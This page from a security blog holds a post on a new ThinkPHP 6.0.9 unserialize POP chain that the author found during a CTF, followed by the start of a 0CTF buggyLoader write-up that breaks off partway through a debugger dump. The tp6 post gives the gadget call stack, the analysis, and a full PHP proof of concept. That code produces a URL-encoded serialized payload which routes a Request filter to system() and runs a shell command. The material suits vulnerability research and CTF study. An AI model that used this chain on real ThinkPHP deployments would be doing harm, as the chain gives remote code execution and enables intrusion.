<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>ccreaterのblog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="ccreaterのblog">
<meta property="og:url" content="https://site.ccreater.top/index.html">
<meta property="og:site_name" content="ccreaterのblog">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="ccreater">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="ccreaterのblog" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 5.4.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">ccreaterのblog</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://site.ccreater.top"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-tp6新pop链" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/11/19/tp6%E6%96%B0pop%E9%93%BE/" class="article-date">
  <time class="dt-published" datetime="2021-11-19T16:00:00.000Z" itemprop="datePublished">2021-11-20</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">漏洞挖掘</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/11/19/tp6%E6%96%B0pop%E9%93%BE/">tp6新pop链</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="tp6新pop链"><a href="#tp6新pop链" class="headerlink" title="tp6新pop链"></a>tp6新pop链</h1><p>周末打西湖有题tp6.0.9的题目，没找到pop链，于是自己挖了一条（后面才知道有现成的能用</p>
<h2 id="调用栈"><a href="#调用栈" class="headerlink" title="调用栈"></a>调用栈</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">Request.php:1418, think\Request-&gt;filterValue()</span><br><span class="line">Request.php:1304, think\Request-&gt;filterData()</span><br><span class="line">Request.php:1286, think\Request-&gt;input()</span><br><span class="line">Request.php:959, think\Request-&gt;get()</span><br><span class="line">Memcache.php:96, think\cache\driver\Memcache-&gt;get()</span><br><span class="line">Driver.php:116, think\cache\driver\Memcache-&gt;push()</span><br><span class="line">Handler.php:128, call_user_func_array:&#123;D:\phpStudy\PHPTutorial\WWW\tp6\vendor\league\flysystem\src\Handler.php:128&#125;()</span><br><span class="line">Handler.php:128, League\Flysystem\File-&gt;__call()</span><br><span class="line">Formatter.php:135, League\Flysystem\File-&gt;push()</span><br><span class="line">Formatter.php:135, think\console\output\Formatter-&gt;format()</span><br><span class="line">Console.php:56, think\console\output\driver\Console-&gt;write()</span><br><span class="line">Output.php:162, think\console\Output-&gt;write()</span><br><span class="line">Output.php:151, think\console\Output-&gt;writeln()</span><br><span class="line">Output.php:132, think\console\Output-&gt;block()</span><br><span class="line">Output.php:222, call_user_func_array:&#123;D:\phpStudy\PHPTutorial\WWW\tp6\vendor\topthink\framework\src\think\console\Output.php:222&#125;()</span><br><span class="line">Output.php:222, think\console\Output-&gt;__call()</span><br><span class="line">ChannelSet.php:36, think\console\Output-&gt;channel()</span><br><span class="line">ChannelSet.php:36, think\log\ChannelSet-&gt;__call()</span><br><span class="line">Conversion.php:272, think\log\ChannelSet-&gt;append()</span><br><span class="line">Conversion.php:272, think\model\Pivot-&gt;appendAttrToArray()</span><br><span class="line">Conversion.php:251, think\model\Pivot-&gt;toArray()</span><br><span class="line">Conversion.php:324, think\model\Pivot-&gt;toJson()</span><br><span class="line">Conversion.php:329, think\model\Pivot-&gt;__toString()</span><br><span class="line">Model.php:361, think\model\Pivot-&gt;db()</span><br><span class="line">Model.php:564, think\model\Pivot-&gt;checkAllowFields()</span><br><span class="line">Model.php:620, think\model\Pivot-&gt;updateData()</span><br><span class="line">Model.php:535, think\model\Pivot-&gt;save()</span><br><span class="line">Model.php:1065, think\model\Pivot-&gt;__destruct()</span><br></pre></td></tr></table></figure>

<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>因为看tp6某些部分和tp5还是有些接近的于是参考之前TCTF挖的tp5的链挖了一条</p>
<p>tp5的调用栈：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Request.php:1090, think\Request-&gt;filterValue()</span><br><span class="line">Request.php:1040, think\Request-&gt;input()</span><br><span class="line">Request.php:706, think\Request-&gt;get()</span><br><span class="line">Memcache.php:66, think\cache\driver\Memcache-&gt;has()</span><br><span class="line">Memcache.php:98, think\cache\driver\Memcache-&gt;set()</span><br><span class="line">Memcache.php:94, think\session\driver\Memcache-&gt;write()</span><br><span class="line">Output.php:154, think\console\Output-&gt;write()</span><br><span class="line">Output.php:143, think\console\Output-&gt;writeln()</span><br><span class="line">Output.php:124, think\console\Output-&gt;block()</span><br><span class="line">Output.php:212, call_user_func_array:&#123;D:\phpStudy\PHPTutorial\WWW\tp5\thinkphp\library\think\console\Output.php:212&#125;()</span><br><span class="line">Output.php:212, think\console\Output-&gt;__call()</span><br><span class="line">Model.php:912, think\console\Output-&gt;getAttr()</span><br><span class="line">Model.php:912, think\model\Pivot-&gt;toArray()</span><br><span class="line">Model.php:936, think\model\Pivot-&gt;toJson()</span><br><span class="line">Model.php:2267, think\model\Pivot-&gt;__toString()</span><br><span class="line">Windows.php:163, file_exists()</span><br><span class="line">Windows.php:163, think\process\pipes\Windows-&gt;removeFiles()</span><br><span class="line">Windows.php:59, think\process\pipes\Windows-&gt;__destruct()</span><br></pre></td></tr></table></figure>

<p>顺着这条链看发现缺了<code>__call</code>的部分，于是找形如:<code>$val-&gt;xxx()</code>的地方</p>
<p>在<code>\think\model\concern\Conversion::appendAttrToArray</code>找到</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">appendAttrToArray</span>(<span class="params"><span class="keyword">array</span> &amp;<span class="variable">$item</span>, <span class="variable">$key</span>, <span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">...</span><br><span class="line">            <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span> ? <span class="variable">$relation</span>-&gt;append(<span class="variable">$name</span>)</span><br><span class="line">                -&gt;toArray() : [];</span><br><span class="line">...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<p>但是有个问题这里传入的$name是个数组，而tp5中<code>__call</code>的目标<code>block</code>的参数类型不同，于是我们要找一处可控参数的<code>__call</code>，爆搜<code>__call</code>找到</p>
<p><code>\think\log\ChannelSet::__call</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;channels <span class="keyword">as</span> <span class="variable">$channel</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;log-&gt;channel(<span class="variable">$channel</span>)-&gt;&#123;<span class="variable">$method</span>&#125;(...<span class="variable">$arguments</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>接着调用<code>think\console\Output::__call</code></p>
<p>继续走下去，tp5中的<code>think\session\driver\Memcache-&gt;write</code>在tp6中无了，只能再找一个能跳到<code>get</code>的跳板了</p>
<p>对着write一个一个翻过去发现<code>think\console\output\driver\Console-&gt;write</code>调了push方法，而<code>think\cache\driver\Memcache-&gt;push</code>的push调用了get从而完成整条利用链</p>
<h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">League</span>\<span class="title">Flysystem</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$path</span>=<span class="string">&quot;thisispath&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filesystem</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filesystem = <span class="keyword">new</span> \think\cache\driver\Memcache();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">console</span>\<span class="title">output</span>\<span class="title">driver</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Console</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$output</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$formatter</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;output = <span class="keyword">new</span> \think\console\Output(<span class="string">&quot;another&quot;</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;formatter = <span class="keyword">new</span> \think\console\output\Formatter();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">console</span>\<span class="title">output</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Formatter</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$styles</span>=[<span class="string">&quot;channel&quot;</span>=&gt;<span class="string">&quot;style&quot;</span>];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$styleStack</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;styleStack = <span class="keyword">new</span> \League\Flysystem\File();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">Attribute</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span> = [<span class="string">&quot;get_parent&quot;</span> =&gt; <span class="string">&quot;data&quot;</span>];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$withAttr</span> = [<span class="string">&quot;get_parent&quot;</span> =&gt; <span class="string">&quot;withAttr&quot;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">cache</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Driver</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">cache</span>\<span class="title">driver</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Memcache</span> <span class="keyword">extends</span> \<span class="title">think</span>\<span class="title">cache</span>\<span class="title">Driver</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$handler</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;handler =<span class="keyword">new</span> \think\Request();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">session</span>\<span class="title">driver</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cache</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">console</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Output</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$handle</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$styles</span> = [</span><br><span class="line">        <span class="string">&#x27;info&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;error&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;comment&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;question&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;highlight&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;warning&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;channel&quot;</span></span><br><span class="line">    ];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span>=<span class="string">&quot;&quot;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$a</span>!=<span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle = <span class="keyword">new</span> \think\console\output\driver\Console();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">log</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ChannelSet</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$channels</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$log</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$obj</span>,<span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;log = <span class="variable">$obj</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;channels = [<span class="variable">$arg</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Attribute</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$lazySave</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$withEvent</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$exists</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$force</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$table</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$relation</span> = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$obj</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;lazySave = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;withEvent = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;exists = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;force = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;table = <span class="variable">$obj</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;relation = [<span class="string">&quot;evil_key&quot;</span>=&gt;<span class="keyword">new</span> \think\log\ChannelSet(<span class="keyword">new</span> \think\console\Output(),<span class="string">&quot;test&quot;</span>)];</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$obj</span>===<span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;append=[<span class="string">&quot;evil_key&quot;</span>=&gt;[<span class="string">&quot;aaa&quot;</span>]];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span></span>&#123;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$get</span> = [<span class="string">&quot;thisispath&quot;</span>=&gt;<span class="string">&quot;whoami&quot;</span>];</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$filter</span>=<span class="string">&quot;system&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Pivot();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> Pivot(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$b</span>));</span><br></pre></td></tr></table></figure>



<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>看起来参考tp5来挖tp6的方法效率还是有点低的我挖了6小时左右才出来（而且链还挺长的，一点也不优雅，更像是用蛮力做出来的），虽然在比赛的时候就想到肯定有现成的，但是可能因为沉没成本的原因不甘心放弃就在眼前的新pop链（实际上我说出了快10次出来了）。有时候过于依赖之前的成功经验也是一种束缚。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://site.ccreater.top/2021/11/19/tp6%E6%96%B0pop%E9%93%BE/" data-id="ckw7zwc1b006mfmolbz4obqkj" data-title="tp6新pop链" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" rel="tag">漏洞挖掘</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-TCTF2021_BuggyLoader" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/11/18/TCTF2021_BuggyLoader/" class="article-date">
  <time class="dt-published" datetime="2021-11-18T16:00:00.000Z" itemprop="datePublished">2021-11-19</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/11/18/TCTF2021_BuggyLoader/">buggyLoader</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="buggyLoader"><a href="#buggyLoader" class="headerlink" title="buggyLoader"></a>buggyLoader</h1><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a target="_blank" rel="noopener" href="https://github.com/c014/0CTF-2021-Final-RevengePHP-and-buggyLoader-exp/blob/main/buggyLoader/Poc.java">https://github.com/c014/0CTF-2021-Final-RevengePHP-and-buggyLoader-exp/blob/main/buggyLoader/Poc.java</a></p>
<p><a target="_blank" rel="noopener" href="http://pipinstall.cn/2021/10/01/TCTF2021%E6%80%BB%E5%86%B3%E8%B5%9B2%E8%A7%A3Java%E4%B8%8EBypass%20Shiro550%20ClassLoader.loadClass/">http://pipinstall.cn/2021/10/01/TCTF2021%E6%80%BB%E5%86%B3%E8%B5%9B2%E8%A7%A3Java%E4%B8%8EBypass%20Shiro550%20ClassLoader.loadClass/</a></p>
<p><a target="_blank" rel="noopener" href="https://hpdoger.cn/2021/10/08/title:%20TCTF2021-final-writeup-1/#bugglyloader">https://hpdoger.cn/2021/10/08/title:%20TCTF2021-final-writeup-1/#bugglyloader</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7950">https://xz.aliyun.com/t/7950</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">urls = &#123;URL[35]@5409&#125; </span><br><span class="line"> 0 = &#123;URL@5410&#125; &quot;jar:file:/opt/app/buggyloader.jar!/BOOT-INF/classes!/&quot;</span><br><span class="line"> 1 = &#123;URL@5411&#125; &quot;jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/spring-boot-2.4.4.jar!/&quot;</span><br><span class="line"> 2 = &#123;URL@5412&#125; &quot;jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/spring-boot-autoconfigure-2.4.4.jar!/&quot;</span><br><span class="line"> 3 = &#123;URL@5413&#125; &quot;jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/logback-classic-1.2.3.jar!/&quot;</span><br><span class="line"> 4 = &#123;URL@5414&#125; &quot;jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/logback-core-1.2.3.jar!/&quot;</span><br><span class="line"> 5 = &#123;URL@5415&#125; &quot;jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/log4j-to-slf4j-2.13.3.jar!/&quot;</span><br><span class="line"> 6 = &#123;URL@5416&#125; &quot;jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/log4j-api-2.13.3.jar!/&quot;</span><br><span class="line"> 7 = &#123;URL@5417&#125; &quot;jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/jul-to-slf4j-1.7.30.jar!/&quot;</span><br><span class="line"> 8 = &#123;URL@5418&#125; &quot;jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/jakarta.annotation-api-1.3.5.jar!/&quot;</span><br><span class="line"> 9 = &#123;URL@5419&#125; &quot;jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/snakeyaml-1.27.jar!/&quot;</span><br><span class="line"> 10 = &#123;URL@5420&#125; &quot;jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/thymeleaf-spring5-3.0.12.RELEASE.jar!/&quot;</span><br><span class="line"> 11 = &#123;URL@5421&#125; &quot;jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/thymeleaf-3.0.12.RELEASE.jar!/&quot;</span><br><span class="line"> 12 = &#123;URL@5422&#125; &quot;jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/attoparser-2.0.5.RELEASE.jar!/&quot;</span><br><span class="line"> 13 = &#123;URL@5423&#125; &quot;jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/unbescape-1.1.6.RELEASE.jar!/&quot;</span><br><span class="line"> 14 = &#123;URL@5424&#125; &quot;jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/slf4j-api-1.7.30.jar!/&quot;</span><br><span class="line"> 15 = &#123;URL@5425&#125; &quot;jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/thymeleaf-extras-java8time-3.0.4.RELEASE.jar!/&quot;</span><br><span class="line"> 16 = 